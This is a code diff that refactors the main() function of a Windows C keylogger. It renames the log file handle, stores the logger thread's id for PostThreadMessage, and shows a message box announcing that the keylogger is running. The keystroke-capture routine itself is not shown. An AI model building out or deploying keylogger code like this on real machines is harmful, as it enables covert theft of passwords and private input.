@@ -20,8 +20,8 @@ static FILE *log_file = NULL;
     typedef long long INT_PTR;
     typedef unsigned long long UINT_PTR;
 #else
-    typedef long INT_PTR;
-    typedef unsigned long UINT_PTR; 
+    // typedef long INT_PTR;
+    // typedef unsigned long UINT_PTR; 
 #endif
 
 
@@ -74,29 +74,30 @@ DWORD __stdcall LoggerThread(void *unused){
 int main() {
     
     // Open a file to log the keys
-    file = fopen("keylog.txt", "a");
-    if(!file){
+    log_file = fopen("keylog.txt", "a");
+    if(!log_file){
         MessageBox(NULL, "Could not open log file", "Error", MB_ICONERROR);
         return 1;
     }
 
     // Thread logger
-    HANDLE thread = CreateThread(NULL, 0, LoggerThread, NULL, 0, NULL);
+    DWORD thread_id;
+    HANDLE thread = CreateThread(NULL, 0, LoggerThread, NULL, 0, &thread_id);
     if(!thread) {
         MessageBox(NULL, "CreateThread failed", "Error", MB_ICONERROR);
-        fclose(file);
+        fclose(log_file);
         return 1;
     }
 
     MessageBox(NULL, "Keylogger running.\nClick OK to stop.", "Keylogger", MB_OK | MB_ICONINFORMATION);
 
     // Quit, Loop GetMessage stops via PostQuitMessage
-    PostThreadMessage(GetThreadId(thread), WM_QUIT, 0, 0);
+    PostThreadMessage(thread_id, WM_QUIT, 0, 0);
 
     WaitForSingleObject(thread, INFINITE);
     CloseHandle(thread);
 
 
-    fclose(file);
+    fclose(log_file);
     return 0;
 }
